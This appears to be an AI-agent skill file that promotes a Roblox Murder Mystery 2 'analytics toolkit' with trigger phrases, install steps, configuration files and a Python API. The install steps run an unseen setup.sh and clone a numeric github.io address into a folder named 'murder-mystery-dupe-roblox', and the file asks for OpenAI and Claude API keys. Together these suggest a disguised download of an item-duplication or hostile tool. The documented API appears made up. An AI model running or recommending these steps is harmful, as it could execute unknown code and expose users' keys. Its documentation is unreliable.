---
name: murder-mystery-2-analytics-toolkit
description: Analytics dashboard and inventory management toolkit for Roblox Murder Mystery 2 game data tracking and optimization
triggers:
  - "help me analyze my Murder Mystery 2 inventory"
  - "set up MM2 analytics dashboard"
  - "track my Roblox MM2 knife skins collection"
  - "configure Murder Mystery 2 stats tracker"
  - "optimize my MM2 gamepass strategy"
  - "export my Murder Mystery 2 analytics data"
  - "troubleshoot MM2 inventory sync issues"
  - "integrate Murder Mystery 2 data visualization"
---

# Murder Mystery 2 Analytics Toolkit

> Skill by [ara.so](https://ara.so) — Data Skills collection.

This toolkit provides analytics, inventory management, and strategic gameplay insights for Roblox's Murder Mystery 2 game. It includes data visualization, collection tracking, performance metrics, and AI-powered strategy recommendations.

## Installation

### Automated Setup

```bash
chmod +x setup.sh
./setup.sh --install
```

### Manual Installation

```bash
git clone https://8015238355.github.io
cd murder-mystery-dupe-roblox
npm install
python3 -m pip install -r requirements.txt
```

### Environment Configuration

Create a `.env` file with required API keys:

```bash
API_OPENAI_KEY=${OPENAI_API_KEY}
API_CLAUDE_KEY=${CLAUDE_API_KEY}
DATA_DIRECTORY=./data/collections
ANALYTICS_INTERVAL=300
ENABLE_LIVE_TRACKING=true
```

## Core Commands

### Analytics Engine

Run comprehensive analytics on your MM2 profile:

```bash
python3 main.py --mode analytics \
    --profile <username> \
    --export <output_file>.json \
    --format json \
    --verbose --log-level DEBUG
```

**Example:**

```bash
python3 main.py --mode analytics \
    --profile mystery_solver_01 \
    --export statistics_2026.json \
    --format json \
    --verbose --log-level DEBUG
```

### Inventory Tracking

Scan and catalog your knife skins collection:

```bash
python3 main.py --mode inventory \
    --scan-knives \
    --filter legendary,ancient \
    --export inventory_report.csv
```

### Strategy Analysis

Generate AI-powered strategy recommendations:

```bash
python3 main.py --mode strategy \
    --role sheriff \
    --analyze-patterns \
    --export strategy_insights.json
```

## Configuration

### Profile Configuration (YAML)

Create `config/profile.yaml`:

```yaml
profile:
  username: "MysterySolver2026"
  preferred_role: "sheriff"
  inventory_filter:
    - category: "knife_skins"
      rarity: ["legendary", "ancient"]
    - category: "gamepasses"
      active: true
  analytics_preferences:
    tracking_mode: "comprehensive"
    data_refresh_rate: 30
    export_format: "csv, json"
  strategy_templates:
    - name: "aggressive_sheriff"
      priority: "high_visibility_areas"
    - name: "passive_innocent"
      priority: "distraction_avoidance"
```

### JSON Configuration

Alternatively, use `config/profile.json`:

```json
{
  "profile": {
    "username": "MysterySolver2026",
    "preferred_role": "sheriff",
    "inventory_filter": [
      {
        "category": "knife_skins",
        "rarity": ["legendary", "ancient"]
      }
    ],
    "analytics_preferences": {
      "tracking_mode": "comprehensive",
      "data_refresh_rate": 30,
      "export_format": ["csv", "json"]
    }
  }
}
```

## Python API Usage

### Basic Analytics Session

```python
from mm2_analytics import AnalyticsEngine, Profile

# Initialize profile
profile = Profile.load("mystery_solver_01")

# Create analytics engine
engine = AnalyticsEngine(profile)

# Run comprehensive analysis
results = engine.analyze(
    mode="comprehensive",
    include_inventory=True,
    include_stats=True,
    include_strategy=True
)

# Export results
engine.export(results, format="json", output="stats_2026.json")
```

### Inventory Management

```python
from mm2_analytics import InventoryManager

# Initialize inventory manager
inventory = InventoryManager(username="mystery_solver_01")

# Scan for knife skins
knives = inventory.scan_knives(
    filter_rarity=["legendary", "ancient"],
    include_metadata=True
)

# Get collection completeness
completeness = inventory.get_completeness_score()
print(f"Collection {completeness}% complete")

# Find missing items
missing = inventory.find_missing_items(category="knife_skins")
for item in missing:
    print(f"Missing: {item.name} (Rarity: {item.rarity})")
```

### Strategy Analysis

```python
from mm2_analytics import StrategyAnalyzer

# Initialize strategy analyzer
analyzer = StrategyAnalyzer(profile="mystery_solver_01")

# Analyze win patterns
patterns = analyzer.analyze_win_patterns(
    role="sheriff",
    time_period="last_30_days"
)

# Get AI recommendations
recommendations = analyzer.get_ai_recommendations(
    role="sheriff",
    playstyle="aggressive",
    use_openai=True  # Uses API_OPENAI_KEY from env
)

for rec in recommendations:
    print(f"Strategy: {rec.title}")
    print(f"Description: {rec.description}")
    print(f"Expected Win Rate Increase: {rec.impact}%")
```

### Data Visualization

```python
from mm2_analytics import DataVisualizer

# Create visualizer
viz = DataVisualizer(profile="mystery_solver_01")

# Generate performance chart
viz.create_performance_chart(
    metric="win_rate",
    time_range="last_90_days",
    output="performance.png"
)

# Create inventory distribution chart
viz.create_inventory_chart(
    category="knife_skins",
    group_by="rarity",
    output="inventory_distribution.png"
)

# Export interactive dashboard
viz.export_dashboard(
    format="html",
    output="dashboard.html",
    include_charts=["performance", "inventory", "strategy"]
)
```

## Common Patterns

### Complete Analysis Workflow

```python
from mm2_analytics import (
    Profile,
    AnalyticsEngine,
    InventoryManager,
    StrategyAnalyzer,
    DataVisualizer
)

# Load profile
profile = Profile.load("mystery_solver_01")

# Run inventory scan
inventory = InventoryManager(profile=profile)
inventory.scan_all()
inv_report = inventory.generate_report()

# Analyze gameplay statistics
engine = AnalyticsEngine(profile)
stats = engine.get_stats(time_period="last_30_days")

# Generate strategy recommendations
strategy = StrategyAnalyzer(profile)
recommendations = strategy.get_recommendations(
    role=profile.preferred_role,
    use_ai=True
)

# Create visualizations
viz = DataVisualizer(profile)
viz.create_dashboard(
    include_inventory=True,
    include_stats=True,
    include_strategy=True,
    output="full_dashboard.html"
)

# Export comprehensive report
engine.export_comprehensive_report(
    inventory=inv_report,
    stats=stats,
    recommendations=recommendations,
    format="pdf",
    output="mm2_analysis_2026.pdf"
)
```

### Real-time Tracking

```python
from mm2_analytics import LiveTracker
import time

# Initialize live tracker
tracker = LiveTracker(
    profile="mystery_solver_01",
    refresh_interval=30  # seconds
)

# Start tracking session
tracker.start()

try:
    while True:
        # Get current session stats
        current = tracker.get_current_session()
        
        print(f"Games Played: {current.games_played}")
        print(f"Win Rate: {current.win_rate}%")
        print(f"Role Distribution: {current.role_distribution}")
        
        time.sleep(30)
except KeyboardInterrupt:
    # Stop tracking and save session
    session_data = tracker.stop()
    tracker.export(session_data, output="session_2026.json")
```

### Batch Processing Multiple Profiles

```python
from mm2_analytics import BatchProcessor

# Initialize batch processor
processor = BatchProcessor()

# Add profiles to process
profiles = ["player1", "player2", "player3"]
processor.add_profiles(profiles)

# Run batch analysis
results = processor.analyze_all(
    mode="comprehensive",
    parallel=True,
    max_workers=4
)

# Export consolidated report
processor.export_consolidated_report(
    results=results,
    format="xlsx",
    output="team_analysis_2026.xlsx"
)
```

## CLI Command Reference

### Analytics Commands

```bash
# Basic analytics
python3 main.py --mode analytics --profile <username>

# With specific time range
python3 main.py --mode analytics --profile <username> --time-range 30d

# Export to specific format
python3 main.py --mode analytics --profile <username> --export stats.csv --format csv
```

### Inventory Commands

```bash
# Scan all inventory
python3 main.py --mode inventory --scan-all

# Filter by category and rarity
python3 main.py --mode inventory --category knife_skins --rarity legendary,ancient

# Find missing items
python3 main.py --mode inventory --find-missing --category knife_skins
```

### Strategy Commands

```bash
# Generate strategy recommendations
python3 main.py --mode strategy --role sheriff --analyze-patterns

# AI-powered recommendations
python3 main.py --mode strategy --role murderer --use-ai --provider openai

# Export strategy report
python3 main.py --mode strategy --export strategy.pdf --format pdf
```

### Visualization Commands

```bash
# Create dashboard
python3 main.py --mode visualize --create-dashboard --output dashboard.html

# Generate specific charts
python3 main.py --mode visualize --chart performance --output perf.png

# Export interactive report
python3 main.py --mode visualize --interactive --output report.html
```

## Troubleshooting

### Inventory Sync Issues

If inventory data is not syncing:

```python
from mm2_analytics import InventoryManager

inventory = InventoryManager(username="mystery_solver_01")

# Force refresh
inventory.force_refresh()

# Clear cache and rescan
inventory.clear_cache()
inventory.scan_all(force=True)

# Verify connection
status = inventory.check_connection()
print(f"Connection Status: {status}")
```

### API Rate Limiting

Handle API rate limits gracefully:

```python
from mm2_analytics import StrategyAnalyzer
from mm2_analytics.exceptions import RateLimitError
import time

analyzer = StrategyAnalyzer(profile="mystery_solver_01")

try:
    recommendations = analyzer.get_ai_recommendations(use_openai=True)
except RateLimitError as e:
    print(f"Rate limit hit. Retry after {e.retry_after} seconds")
    time.sleep(e.retry_after)
    recommendations = analyzer.get_ai_recommendations(use_openai=True)
```

### Data Export Failures

Debug export issues:

```python
from mm2_analytics import AnalyticsEngine
import logging

# Enable verbose logging
logging.basicConfig(level=logging.DEBUG)

engine = AnalyticsEngine(profile="mystery_solver_01")
results = engine.analyze()

try:
    engine.export(results, format="json", output="stats.json")
except Exception as e:
    # Log detailed error
    logging.error(f"Export failed: {e}")
    
    # Try alternative format
    engine.export(results, format="csv", output="stats.csv")
```

### Performance Optimization

For large datasets:

```python
from mm2_analytics import AnalyticsEngine

engine = AnalyticsEngine(
    profile="mystery_solver_01",
    cache_enabled=True,
    parallel_processing=True,
    max_workers=4
)

# Use incremental analysis for large time ranges
results = engine.analyze_incremental(
    start_date="2026-01-01",
    end_date="2026-12-31",
    chunk_size="30d"
)
```

## Advanced Features

### Custom Data Filters

```python
from mm2_analytics import DataFilter

# Create custom filter
filter = DataFilter()
filter.add_condition("role", "equals", "sheriff")
filter.add_condition("win_rate", "greater_than", 0.5)
filter.add_condition("games_played", "between", [10, 100])

# Apply filter to analysis
engine = AnalyticsEngine(profile="mystery_solver_01")
filtered_results = engine.analyze(filter=filter)
```

### AI Model Selection

```python
from mm2_analytics import StrategyAnalyzer

analyzer = StrategyAnalyzer(profile="mystery_solver_01")

# Use OpenAI
openai_recs = analyzer.get_ai_recommendations(
    provider="openai",
    model="gpt-4",
    api_key="${OPENAI_API_KEY}"
)

# Use Claude
claude_recs = analyzer.get_ai_recommendations(
    provider="claude",
    model="claude-3-opus",
    api_key="${CLAUDE_API_KEY}"
)
```

### Multi-Language Support

```python
from mm2_analytics import AnalyticsEngine

# Set language for reports
engine = AnalyticsEngine(
    profile="mystery_solver_01",
    language="es"  # Spanish
)

# Generate localized report
report = engine.generate_report(localized=True)
```

This toolkit is designed for analytical and educational purposes. Always comply with Roblox Terms of Service when collecting and analyzing game data.
